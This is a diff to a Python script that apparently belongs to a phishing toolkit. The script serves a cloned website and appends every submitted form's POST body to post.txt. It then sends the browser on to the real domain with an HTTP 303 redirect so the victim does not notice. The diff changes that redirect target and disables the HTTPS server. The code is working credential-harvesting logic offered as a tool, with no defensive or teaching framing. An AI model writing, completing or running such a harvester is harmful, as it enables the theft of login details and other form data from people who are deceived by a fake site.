@@ -76,7 +76,6 @@ if not os.path.isfile(INDEX_PATH):
 
 
 redirect_ip = input("[*] What is the IP/domain <form> actions should forward to : ")
-#ssl_hostname = ### 
 
 #"[*] Which domain(s) should we forward requests we can't answer?"
 
@@ -109,6 +108,7 @@ class SimpleHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         print("[*] GET request received!")                                      # Print that we received a request
 
+        # If we can't send the ressource, forward the GET request to the original site 
         if os.path.exists(self.translate_path(self.path)):                      # Check if we have the requested file
             f = self.send_head()                                                # Send headers
             if f:
@@ -131,7 +131,7 @@ class SimpleHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         if self.path == "/custom_path_for_form_post_requests":                          # Check if the POST request path is "/custom_path_for_form_post_requests" (where we directed our form actions)
             print("[*] Form was filled! Writing output to post.txt ...")
             self.send_response(303)                                                     # We use HTTP 303 to force the browser to perform a GET request on our redirect ip/domain.
-            self.send_header("Location", url)                                           # Set "Location" header to our initial URL
+            self.send_header("Location", "https://{}".format(redirect_ip))              # Set "Location" header to our initial URL
             with open(POST_PATH, 'a+') as file:                                         # Open post.txt in append mode to add the entire POST request
                 file.write(body.decode("utf-8"))
                 file.write("\n\n")
@@ -153,22 +153,25 @@ def launch_server(port, http):
     if http:
         try:
             print("[*] Serving HTTP at port {}.".format(port))
-            httpd.serve_forever()
-        except KeyboardInterrupt:
-            httpd.server_close()
-    else: # HTTPS
-        # Wrap the socket with SSL for HTTPS
-        cert_path = os.path.join(CURRENT_PATH, "localhost.crt")
-        key_path = os.path.join(CURRENT_PATH, "localhost.key")
-        httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile=cert_path, keyfile=key_path)
-        try:
-            print("[*] Serving HTTPS at port {}.".format(port))
             print("\n[*] Use CTRL+C to exit and close the HTTP server.")
             httpd.serve_forever()
         except KeyboardInterrupt:
             httpd.server_close()
+    
+    # Removed SSL for now
+    #else: # HTTPS
+        # Wrap the socket with SSL for HTTPS
+    #    cert_path = os.path.join(CURRENT_PATH, "localhost.crt")
+    #    key_path = os.path.join(CURRENT_PATH, "localhost.key")
+    #    httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile=cert_path, keyfile=key_path)
+    #    try:
+    #        print("[*] Serving HTTPS at port {}.".format(port))
+    #        print("\n[*] Use CTRL+C to exit and close the HTTP server.")
+    #        httpd.serve_forever()
+    #    except KeyboardInterrupt:
+    #        httpd.server_close()
         
 print("\n[*] Launching HTTP/HTTPS server ...")
 Thread(target=launch_server, args=(PORT, True)).start()
-Thread(target=launch_server, args=(SSL_PORT, False)).start()
+#Thread(target=launch_server, args=(SSL_PORT, False)).start()
 
